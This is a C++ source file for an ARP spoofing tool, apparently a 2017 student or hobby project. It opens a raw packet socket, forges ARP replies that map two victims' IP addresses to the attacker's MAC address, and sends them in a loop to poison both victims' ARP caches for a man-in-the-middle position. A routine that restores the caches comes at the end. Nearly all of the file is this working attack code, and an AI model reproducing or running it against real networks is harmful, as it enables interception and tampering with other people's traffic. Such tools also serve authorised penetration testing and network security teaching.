/*
 * spoofer.cpp
 *
 *  Created on: Apr 9, 2017
 *      Author: Jan Profant
 */

#include "spoofer.h"
#include "errormsg.h"

#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>
#include <cstdio>
#include <cstring>

/**
 * @brief Class constructor.
 */
Spoofer::Spoofer() : m_isSIGINT(false), m_protocol(ARP), m_ipType(Host::INVALID), m_interval(0), mp_host1(0), mp_host2(0), mp_interface(0) {
}

/**
 * @brief Class destructor.
 */
Spoofer::~Spoofer() {
}

/**
 * @brief Sets type of protocol.
 */
void Spoofer::SetProtocolType(std::string t) {
	if (t == "arp")
		m_protocol = ARP;
	if (t == "ndp")
		m_protocol = NDP;
}

/**
 * @brief Sets IP address of first victim.
 */
bool Spoofer::SetVictim1IP(std::string ip) {
	int ip_type = Host::IsValidIP(ip);
	if (ip_type == Host::IPv4) {
		m_ipType = Host::IPv4;
		unsigned char *p_ip = new unsigned char[4];
		Host::String2IPv4(ip.c_str(), p_ip);
		if (mp_host1 == 0)
			mp_host1 = new Host();
		mp_host1->AddIPv4(p_ip);
		delete[] p_ip;
		return true;
	}
	if (ip_type == Host::IPv6) {
		m_ipType = Host::IPv6;
//		TODO
		return true;
	}
	return false;
}

/**
 * @brief Sets IP address of second victim.
 */
bool Spoofer::SetVictim2IP(std::string ip) {
	int ip_type = Host::IsValidIP(ip);
	if (ip_type == Host::IPv4) {
		m_ipType = Host::IPv4;
		unsigned char *p_ip = new unsigned char[4];
		Host::String2IPv4(ip.c_str(), p_ip);
		if (mp_host2 == 0)
			mp_host2 = new Host();
		mp_host2->AddIPv4(p_ip);
		delete[] p_ip;
		return true;
	}
	if (ip_type == Host::IPv6) {
		m_ipType = Host::IPv6;
//		TODO
		return true;
	}
	return false;
}

/**
 * @brief Starts spoofing of first victim.
 */
void *Spoofer::StartVictim1() {
	FillHeaders(&m_arpPacket1 , 0);
	int sockfd = OpenSocket();
	if (sockfd < 0)
		print_msg_and_abort("Can not open socket!");
	ARPInjection(sockfd, &m_arpPacket1);
	return 0;
}

/**
 * @brief Starts spoofing of second victim.
 */
void *Spoofer::StartVictim2() {
	FillHeaders(&m_arpPacket2, 1);
	int sockfd = OpenSocket();
	if (sockfd < 0)
		print_msg_and_abort("Can not open socket!");
	ARPInjection(sockfd, &m_arpPacket2);
	return 0;
}

/**
 * @brief Sets MAC address of first victim.
 */
bool Spoofer::SetVictim1MAC(std::string mac) {
	if (!Host::IsValidMAC(mac))
		return false;
	else {
		unsigned char *p_mac = new unsigned char[6];
		Host::String2MAC(mac.c_str(), p_mac);
		if (mp_host1 == 0)
			mp_host1 = new Host();
		mp_host1->SetMAC(p_mac);
		delete[] p_mac;
		return true;
	}
}

/**
 * @brief Sets MAC address of second victim.
 */
bool Spoofer::SetVictim2MAC(std::string mac) {
	if (!Host::IsValidMAC(mac))
		return false;
	else {
		unsigned char *p_mac = new unsigned char[6];
		Host::String2MAC(mac.c_str(), p_mac);
		if (mp_host2 == 0)
			mp_host2 = new Host();
		mp_host2->SetMAC(p_mac);
		delete[] p_mac;
		return true;
	}
}

/**
 * @brief Frees class data structures.
 */
void Spoofer::Free() {
	mp_host1->Free();
	mp_host2->Free();
    mp_interface->Free();
}

/**
 * @brief Sets name of interface and initializes it.
 */
bool Spoofer::SetInterface(std::string inface) {
    m_interface = inface;
    mp_interface = new Interface(inface);
    return mp_interface->m_isInitialized;
}

/**
 * @brief Open socket connection.
 * Based on: https://github.com/VincentDary/ArpSpoof/blob/master/ArpSpoof.c
 */
int Spoofer::OpenSocket() {
	int sock = 0;
	struct sockaddr_ll iface;
	struct ifreq index;

	memset(&iface, 0, sizeof(iface));
	memset(&index, 0, sizeof(index));
	strncpy((char *)index.ifr_name, m_interface.c_str(), IFNAMSIZ);

	sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (sock < 0)
		return -1;
	if (ioctl(sock, SIOCGIFINDEX, &index) < 0)
		return -1;

	iface.sll_family = AF_PACKET;
	iface.sll_ifindex = index.ifr_ifindex;
	iface.sll_protocol = htons(ETH_P_ALL);

	if (bind(sock, (struct sockaddr *)&iface, sizeof(struct sockaddr_ll)) < 0)
		return -1;
	return sock;
}

/**
 * @brief Run ARP injection.
 * Based on: https://github.com/VincentDary/ArpSpoof/blob/master/ArpSpoof.c
 */
void Spoofer::ARPInjection(int sockfd, arp_packet *h) {
	unsigned char *buffer = NULL;
	ssize_t byteSent = 0;

	buffer = (unsigned char *) h;
//		hex_dump((const unsigned char*)buffer, sizeof(struct ArpPacket));

	while(1)
	{
		if (m_isSIGINT)
			break;
		byteSent = write(sockfd, buffer, ARP_PACKET_LEN);
		usleep(m_interval * 1000);
	}
	close(sockfd);
}

/**
 * @brief Fill ARP headers.
 */
void Spoofer::FillHeaders(arp_packet *h, unsigned int index) {
	memcpy(h->eth.smac, mp_interface->m_mac, sizeof(unsigned char) * 6);
	h->eth.ethType = htons(0x806);
	h->arp.hrd = htons(0x01);
	h->arp.proto = htons(0x800);
	h->arp.hrd_add_len = 0x06;
	h->arp.proto_add_len = 0x04;
	h->arp.op = htons(0x01);
	memcpy(h->arp.smac, mp_interface->m_mac, sizeof(unsigned char) * 6);
	if (index == 0) {
		memcpy(h->eth.dmac, mp_host2->GetMAC(), sizeof(unsigned char) * 6);
		memcpy(h->arp.sip, mp_host1->GetIPv4(0), sizeof(unsigned char) * 4);
		memcpy(h->arp.dmac, mp_host2->GetMAC(), sizeof(unsigned char) * 6);
		memcpy(h->arp.dip, mp_host2->GetIPv4(0), sizeof(unsigned char) * 4);
	}
	else {
		memcpy(h->eth.dmac, mp_host1->GetMAC(), sizeof(unsigned char) * 6);
		memcpy(h->arp.sip, mp_host2->GetIPv4(0), sizeof(unsigned char) * 4);
		memcpy(h->arp.dmac, mp_host1->GetMAC(), sizeof(unsigned char) * 6);
		memcpy(h->arp.dip, mp_host1->GetIPv4(0), sizeof(unsigned char) * 4);
	}
}

/**
 * @brief Reset ARP cache to initial state.
 */
void Spoofer::ResetARP() {
	std::cout << "INFO: Reseting ARP cache to previous states ..." << std::endl;
	m_isSIGINT = true;
	usleep(m_interval * 1000);
	unsigned char *buffer = NULL;

	int sockfd = OpenSocket();
	if (sockfd < 0)
		print_msg_and_abort("Can not open socket!");

	memcpy(&m_arpPacket1.arp.smac, mp_host1->GetMAC(), sizeof(unsigned char) * 6);
	buffer = (unsigned char *) &m_arpPacket1;

	write(sockfd, buffer, ARP_PACKET_LEN);
	usleep(m_interval * 1000);

	memcpy(&m_arpPacket2.arp.smac, mp_host2->GetMAC(), sizeof(unsigned char) * 6);
	buffer = (unsigned char *) &m_arpPacket2;

	write(sockfd, buffer, ARP_PACKET_LEN);

	return;
}
